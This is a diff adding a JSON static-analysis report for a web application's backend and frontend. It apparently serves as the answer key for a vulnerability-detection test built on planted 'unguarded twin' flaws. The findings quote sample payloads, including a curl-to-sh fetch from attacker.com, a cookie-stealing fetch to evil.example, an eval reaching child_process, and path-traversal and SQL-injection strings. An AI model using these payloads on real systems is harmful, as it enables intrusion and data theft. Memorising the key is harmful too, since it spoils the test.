@@ -1,0 +1,734 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-shell-spawn",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 169,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 169,
+        "col": 108,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportComplianceCertificate() builds a shell command string with `spawn(\\`openssl x509 -in ${sourcePath} -outform ${certFormat} -out ${outputPath}\\`, { shell: true })`. `certFormat` comes directly from the unvalidated request body (`@Body('certFormat')` in api-keys.controller.ts complianceCertificate()) and is executed with `shell: true`, so shell metacharacters (`;`, `$()`, backticks) in certFormat let an attacker run arbitrary OS commands. The sibling method previewComplianceCertificateExport() validates certFormat against an allow-list and uses execFileSync with an argument array (shell:false), confirming this path is the unguarded one.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "backend/src/modules/exports/exports.service.ts",
+      "start": {
+        "line": 216,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 216,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderBoardPacket() runs `execSync(\\`pandoc ${sourcePath} -o ${outputPath} --template=${boardTemplate}\\`)` where `boardTemplate` is taken directly from the unvalidated `layout` query parameter (exports.controller.ts boardPacket()). execSync spawns a shell, so an attacker-controlled layout value like `x --template=$(curl attacker.com/x|sh)` or containing `;` results in arbitrary command execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.eval-code-injection",
+      "path": "backend/src/modules/deals/deals.service.ts",
+      "start": {
+        "line": 184,
+        "col": 27,
+        "offset": 0
+      },
+      "end": {
+        "line": 184,
+        "col": 96,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomWeighting() executes `new Function('context', \\`with (context) { return (${rule}); }\\`)(context)` where `rule` is taken directly from the unvalidated `rule` query parameter (deals.controller.ts weightingPreview()). This evaluates arbitrary attacker-supplied JavaScript on the server, e.g. `rule=require('child_process').execSync('id')` (Node's `require` is reachable from the function scope), giving full remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-95: Eval Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 216,
+        "col": 21,
+        "offset": 0
+      },
+      "end": {
+        "line": 216,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderRenewalOutreachMessage() calls `Handlebars.compile(templateContent)` where `templateContent` is the raw, attacker-controlled request body (organizations.controller.ts renewalOutreach(), `@Body('templateContent')`). Handlebars templates can reach `constructor.constructor` to execute arbitrary code (a well-known Handlebars SSTI/RCE gadget), so this compiles and renders a fully attacker-controlled template. The sibling escalations.service.ts generateCustomerResolutionNotice() only ever compiles a fixed, hardcoded template string, confirming the difference is intentional.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-query",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 70,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 71,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findDuplicateCandidates() builds a raw SQL string via template literal interpolation of `organizationId`, `originalName`, and `mimeType` and executes it with `this.docRepo.query(query)`. `originalName`/`mimeType` come straight from the uploaded file's client-supplied metadata and `organizationId` from an untyped `dto: any` body (documents.controller.ts create()), so an attacker can break out of the string literals to inject arbitrary SQL, e.g. via a filename like `x', '') OR 1=1; --`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-unescaped",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 128,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 128,
+        "col": 96,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findInLegacyIndex() concatenates the attacker-controlled `x-catalog-term` header value (documents.controller.ts searchLegacyIndex()) directly into an XPath expression with no escaping at all: `//document[contains(name, '${searchTerm}') or contains(tag, '${searchTerm}')]`. A value like `x') or contains(name,'` breaks out of the intended clause, allowing arbitrary XPath injection against the legacy index document.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-broken-escape",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 265,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 265,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findInLegacyCaseArchive() builds an XPath expression from the attacker-controlled `x-case-reference` header (escalations.controller.ts searchLegacyCaseArchive()) using escapeXPathString() (line 38-40), which prefixes backslashes before quotes. XPath 1.0 string literals have no backslash-escape mechanism, so a single-quote in the input still terminates the literal early (e.g. `foo\\'` still closes the string at the quote) \u2014 the 'escaping' does not actually neutralize the injection, letting an attacker inject arbitrary XPath predicates.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unvalidated-attachment-read",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 443,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 446,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadCaseAttachment(fileName) joins the raw, attacker-controlled `fileName` route param (escalations.controller.ts getAttachment(), GET /escalations/attachments/:fileName) into a path with no normalization/containment check, then reads it with fs.readFileSync. A value like `../../../../etc/passwd` reads arbitrary files on the host. The sibling loadCaseAttachmentVerified() resolves the path and checks it stays inside the base directory, confirming this unverified path is the vulnerable one.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.quick-reply-template-read",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 347,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 353,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadQuickReplyTemplate(templateName) joins the raw, attacker-controlled `templateName` body field (escalations.controller.ts previewQuickReply(), POST /escalations/quick-replies/preview) directly into a filesystem path and reads it, allowing arbitrary file read via `../` sequences. The sibling loadApprovedQuickReplyTemplate() calls `path.basename(templateName)` first to strip any directory components, confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.attachment-upload-filename",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 397,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 413,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadCaseAttachment() builds the destination filename as `${esc.id}-${file.originalname}` (line 400) and writes it with fs.writeFileSync \u2014 `file.originalname` is fully attacker-controlled multipart metadata and is never sanitized, so a filename containing `../` sequences can write the uploaded content outside CASE_ATTACHMENTS_PUBLIC_DIR. There is also no MIME-type or size restriction. The sibling uploadCaseAttachmentValidated() generates the filename server-side with crypto.randomUUID() and validates MIME type/size, confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.report-snapshot-read",
+      "path": "backend/src/modules/exports/exports.service.ts",
+      "start": {
+        "line": 166,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 177,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "retrieveArchivedReportSnapshot() joins the raw, attacker-controlled `reportLabel` route param (exports.controller.ts archivedSnapshot(), GET /exports/:reportLabel/archived-snapshot) into a path and reads it with fs.readFileSync, with no containment check. The sibling retrieveArchivedReportSnapshotVerified() resolves the path and verifies it stays under the archive root before reading, confirming this version is the unguarded one and vulnerable to path traversal (e.g. `reportLabel=../../../../etc/hosts%00` style traversal to any `*.csv`-suffixed path, or to any path an attacker can otherwise reach).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-authorization-webhook-subscription",
+      "path": "backend/src/modules/webhooks/webhooks.controller.ts",
+      "start": {
+        "line": 48,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "adjustSubscription() (PATCH /webhooks/:id/subscription) is the only endpoint in this controller missing an `@Roles(...)` decorator. RolesGuard.canActivate() returns true when no roles are set on the handler, so any authenticated user of any role \u2014 including CUSTOMER_CONTACT \u2014 can call it. The underlying service method adjustWebhookSubscription() (webhooks.service.ts lines 65-68) performs no organization-ownership or role check either, unlike update() just above it which checks `wh.organizationId !== actor.organizationId`. Together this lets any authenticated user modify the events/isActive subscription of any organization's webhook.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-webhook-delivery-detail",
+      "path": "backend/src/modules/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 163,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 175,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getDeliveryDetailForPortal() gates CUSTOMER_CONTACT access using a client-supplied, unsigned cookie value (`accountType`) instead of any server-side authorization check, and never verifies that the requested webhook (`webhookId`) belongs to the caller's organization at all (unlike getDeliveryDigestForPortal() just below it, which checks `wh.organizationId !== user.organizationId`). Any customer contact can set `Cookie: accountType=enterprise-portal-owner` to satisfy the check and then read webhook delivery details for any organization's webhook by id.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-807: Reliance on Untrusted Inputs in a Security Decision"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.webhook-arbitrary-url-fetch",
+      "path": "backend/src/modules/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 97,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 118,
+        "col": 7,
+        "offset": 0
+      },
+      "extra": {
+        "message": "updateEndpointUrl() lets an ACCOUNT_MANAGER/PLATFORM_ADMIN set a webhook's `url` to any value with no host allow-list, and testDelivery() then performs a server-side `fetch(wh.url, ...)` against it. An attacker with webhook-management access can point the URL at internal-only services (e.g. cloud metadata endpoints, internal admin panels) and trigger testDelivery to make the server issue requests on their behalf. documents.service.ts registerLinkedSource() validates external URLs against an ALLOWED_LINKED_SOURCE_HOSTS allow-list, showing this codebase is aware of the pattern but omits it here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.unverified-jwt-handoff-assertion",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 364,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 375,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeFromHandoffAssertion() calls `jwt.decode(assertionToken)` \u2014 which decodes the JWT payload WITHOUT verifying its signature \u2014 and then trusts the `escalationId`/`responderId` claims from it to look up and return escalation data. Any attacker can craft an arbitrary unsigned/self-signed JWT with any escalationId to retrieve that escalation and claim any responderId identity. The sibling resumeFromRotationAssertion() correctly calls `jwt.verify(assertionToken, ONCALL_HANDOFF_SECRET, { algorithms: ['HS256'] })`, confirming the handoff path is the vulnerable, unverified twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.session-fixation-kiosk-checkin",
+      "path": "backend/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 209,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 226,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "checkInAtSiteKiosk() accepts a client-supplied `kioskSessionId` and uses it verbatim as the session key stored server-side (`siteKioskSessions.set(kioskSessionId, ...)`) and as the cookie value sent back to the browser. Because the session identifier originates from the client rather than being generated server-side, an attacker can pre-choose a session id, get a victim to authenticate through this endpoint using it (or a shared kiosk device), and then use the same known id to hijack the resulting session. The sibling checkInFromFieldDevice() explicitly discards the client-supplied id and mints a fresh one with `crypto.randomBytes(32)`, confirming the kiosk path is the vulnerable, unguarded twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-prng-password-reset-token",
+      "path": "backend/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 119,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 125,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sendPasswordResetEmail() generates the password-reset token with `Math.random().toString(36)...` \u2014 a non-cryptographic, predictable PRNG \u2014 and uses it as the sole credential to reset any account's password via confirmPasswordReset(). Math.random() output can be predicted/brute-forced, unlike the codebase's own email-verification code (`crypto.randomInt`) and field-device session id (`crypto.randomBytes`), which correctly use the `crypto` module for security-sensitive tokens.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.prototype-pollution-widget-config",
+      "path": "backend/src/modules/organizations/organization-widgets.service.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadApplicationConfig() merges an attacker-controlled JSON object (parsed from the unauthenticated `x-embed-config` header on POST /public/organizations/:id/widget-config, which has no auth guard at all) into `org.widgetConfig` using the unsafe `deepAssign()` helper, rather than `deepAssignSafe()` which strips `__proto__`/`constructor`/`prototype` keys (used elsewhere, e.g. users.service.ts registerUserPreferences()). An unauthenticated request with a body like `{\"__proto__\":{\"polluted\":true}}` can pollute Object.prototype for the whole Node process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.partner-handoff",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 235,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 247,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePartnerHandoffDestination() returns the raw, attacker-controlled `continueUrl` query parameter unchanged, which organizations.controller.ts completePartnerHandoff() then passes straight to `res.redirect(destination)` with no host validation at all. Any authenticated PLATFORM_ADMIN/ACCOUNT_MANAGER-triggered link can be crafted to redirect victims to an arbitrary external site (e.g. a phishing page). The sibling resolveDirectorySyncReturnDestination() validates that the destination's hostname matches the organization's own domain before redirecting, confirming this is the unguarded twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.deal-board-quick-edit",
+      "path": "backend/src/modules/deals/deals.service.ts",
+      "start": {
+        "line": 164,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 178,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBoardQuickEdit() applies the entire request body directly onto the Deal entity via `Object.assign(deal, fields)`, with `fields: Record<string, any>` completely unrestricted (deals.controller.ts boardQuickEdit()). This lets any ACCOUNT_MANAGER/SUPPORT_AGENT overwrite fields the quick-edit UI never exposes, e.g. `organizationId`, `assignedToId`, or `value`, moving a deal to a different organization or owner. The sibling escalations.service.ts applyQueueBoardQuickEdit() explicitly destructures and whitelists only `title, description, customerVisibleSummary`, confirming this is the unguarded twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.organization-backup-restore",
+      "path": "backend/src/modules/imports/imports.service.ts",
+      "start": {
+        "line": 122,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 148,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreOrganizationBackup() parses an uploaded file as JSON and applies it in full onto the Organization entity via `Object.assign(org, snapshot)` with no field whitelist or type validation. The sibling restoreDealBackup() validates the uploaded snapshot through a typed DealBackupDto with class-validator (`whitelist: true`) before applying only the validated fields, confirming this organization-restore path is the unguarded twin allowing arbitrary field overwrite from an uploaded file.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unscoped-activity-feed-segments",
+      "path": "backend/src/modules/activity/activity.service.ts",
+      "start": {
+        "line": 42,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findByFeedSegment() forwards the entire client-supplied `criteria` object straight into a TypeORM `where` clause with no field whitelist and no organization/user scoping. The controller endpoint (activity.controller.ts feedSegment(), POST /activity/feed-segments) has no RolesGuard and no per-user filtering at all, so any authenticated user \u2014 including a CUSTOMER_CONTACT who is normally restricted to their own organization's activity via the GET / endpoint \u2014 can call this endpoint with an empty or crafted body to retrieve activity records across every organization. The analogous notifications.service.ts findBySegment() forces `where = { userId }` and only allows two whitelisted extra fields, confirming this is the unguarded twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.untrusted-header-entitlement-bypass",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 253,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 277,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyEntitlementFromProviderHeader() reactivates a revoked API key based on `actor.role == UserRole.PLATFORM_ADMIN || providerResult.access`, where `providerResult` is parsed straight from the client-supplied `x-billing-entitlement` header with no signature or provenance verification. Because the header is fully attacker-controlled and the check is an OR (not requiring admin), any ACCOUNT_MANAGER can send `x-billing-entitlement: {\"access\":true}` to reactivate any organization's API key, bypassing the intended billing-provider-only entitlement flow.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-807: Reliance on Untrusted Inputs in a Security Decision"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-innerhtml-bypass-sanitizer",
+      "path": "frontend/src/app/components/escalations/escalation-detail.component.ts",
+      "start": {
+        "line": 124,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 127,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildSummaryWidget() interpolates `esc.customerVisibleSummary` (a field editable by staff via the escalations API and rendered to every viewer, including customers) directly into a raw HTML string inside an `onclick` attribute, then calls `sanitizer.bypassSecurityTrustHtml(raw)` to disable Angular's built-in sanitization before binding it via `[innerHTML]` (line 37). A summary containing `');fetch('https://evil.example/steal?c='+document.cookie);//` breaks out of the intended `onclick` handler and executes attacker-controlled JavaScript in every viewer's browser \u2014 a stored XSS. The sibling deals-list.component.ts buildQuickNoteWidget() HTML-escapes its interpolated value (`htmlEscape(row.title)`) before the same bypassSecurityTrustHtml pattern, confirming this is the unescaped twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting (XSS)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.type-coercion-tier-bypass",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 180,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 200,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyLegacyPartnerRebate() gates the rebate on `record.access` being truthy, but legacy-partner-tier-feed.ts stores tier 3 ('platinum-legacy') with `access: 'false'` \u2014 a non-empty string, which is truthy in JavaScript. This lets an ACCOUNT_MANAGER apply the intentionally-denied 'platinum-legacy' rebate tier. The sibling previewLegacyPartnerRebate() correctly uses a strict `record.access === true` comparison, confirming the mutating endpoint has the broken check.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-697: Incorrect Comparison"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.uncontrolled-recursion-duplicate-chain",
+      "path": "backend/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 308,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 314,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "traceDuplicateOriginChain() recurses on `esc.duplicateOfId` with no depth or cycle guard. `duplicateOfId` is settable via the generic PATCH :id update() endpoint (dto: any), so a staff user can create a cycle (e.g. A.duplicateOfId = B, B.duplicateOfId = A) or a self-reference, causing unbounded recursion and a stack-overflow crash when GET /escalations/:id/duplicate-chain is called. The sibling resolveCommentThreadChain() explicitly caps recursion with `MAX_COMMENT_THREAD_DEPTH`, confirming this path is missing the equivalent guard.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-674: Uncontrolled Recursion"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfig.session-cookie-missing-flags",
+      "path": "backend/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 255,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 255,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "startOrganizationQuickAccess() sets the session cookie with `res.cookie('sessionId', quickAccessToken)` and no options at all \u2014 missing `httpOnly`, `secure`, and `sameSite`. This exposes the token to client-side script (XSS-driven theft) and sends it over plain HTTP and in cross-site contexts. The sibling startSupportConsoleSession() sets the same-named cookie with `httpOnly: true, secure: ..., sameSite: 'strict'`, confirming this is the misconfigured twin.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.disclosure.sensitive-payload-logged",
+      "path": "backend/src/modules/api-keys/api-keys.service.ts",
+      "start": {
+        "line": 210,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 210,
+        "col": 96,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncIntegrationCredentialFromPartner() logs the entire raw partner payload with `JSON.stringify(partnerPayload)`, potentially writing sensitive integration credentials or PII to application logs. The sibling syncIntegrationCredentialFromPartnerSafely() logs only the field names, not values, confirming this is the over-logging twin.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.unvalidated-origin-reflection",
+      "path": "backend/src/modules/organizations/organization-widgets.controller.ts",
+      "start": {
+        "line": 35,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renewalBadge() reflects any incoming `Origin` header straight into `Access-Control-Allow-Origin` with no validation, allowing any external website to cross-origin-read this (unauthenticated, public) endpoint's response. The sibling surveyWidget() only reflects the origin after isOriginAllowedForSurvey() confirms it matches the organization's own domain, confirming this endpoint is missing the equivalent origin check.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
